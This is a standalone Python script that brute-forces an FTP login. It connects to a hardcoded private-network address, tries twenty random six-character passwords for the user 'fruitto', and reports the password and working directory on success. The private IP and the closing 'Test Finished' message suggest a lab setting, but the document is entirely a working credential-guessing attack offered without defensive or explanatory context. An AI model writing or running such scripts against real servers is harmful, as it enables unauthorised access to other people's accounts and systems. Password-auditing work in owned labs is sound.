import ftplib
import random
import string
import time
import socket

TARGET_IP = '192.168.122.109'
TARGET_PORT = 21
USERNAME = 'fruitto'
MAX_ATTEMPTS = 20

def generate_random_password(length=8):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def ftp_brute_force():
    print(f"[*] Starting FTP Brute Force on {USERNAME}@{TARGET_IP}...")

    for i in range(1, MAX_ATTEMPTS + 1):
        password_guess = generate_random_password(length=6)
        ftp = ftplib.FTP()
        try:
            print(f"[{i}/{MAX_ATTEMPTS}] Trying password: {password_guess}", end='\r')
            ftp.connect(TARGET_IP, TARGET_PORT, timeout=5)
            ftp.login(user=USERNAME, passwd=password_guess)
            print(f"\n[+] SUCCESS! Password found: {password_guess}")
            print(f"Current Directory: {ftp.pwd()}")
            ftp.quit()
            break

        except ftplib.error_perm as e:
            try:
                ftp.quit()
            except:
                pass

        except (socket.error, EOFError) as e:
            print(f"\n[!] Connection Error: {e} (Server might be blocking or down)")
            break

        except Exception as e:
            print(f"\n[!] Unexpected Error: {e}")
            break

        finally:
            try:
                ftp.close()
            except:
                pass
            time.sleep(0.1)

    print("\n[*] Test Finished.")

if __name__ == "__main__":
    ftp_brute_force()